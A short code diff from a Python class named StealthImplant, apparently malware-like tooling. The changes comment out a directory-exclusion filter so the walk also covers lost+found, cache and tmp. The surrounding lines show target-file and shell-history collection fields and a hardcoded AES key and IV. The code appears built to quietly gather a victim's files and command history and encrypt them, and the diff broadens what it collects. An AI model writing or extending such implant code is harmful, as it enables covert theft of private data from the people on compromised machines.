@@ -34,7 +34,7 @@ class StealthImplant:
         self.target_files=target_files
         self.history_glob=history_glob
         self.test=test
-        self.ignore_dirs = {"lost+found", "cache", "tmp" }
+        # self.ignore_dirs = {"lost+found", "cache", "tmp" }
         self.encryption_key = b'16bytessecretkey'  # AES-128
         self.encryption_iv = b'16bytepubliciv!!'
         
@@ -68,7 +68,7 @@ class StealthImplant:
     def walk_dir(self):
         collected = [] 
         for root, dirs, files in os.walk(self.root_dir, followlinks=False):
-            dirs[:] = [d for d in dirs if d not in self.ignore_dirs]
+            # dirs[:] = [d for d in dirs if d not in self.ignore_dirs]
             
             # if current directly is what we are looking for
             if any(target_dir in root for target_dir in self.target_files):
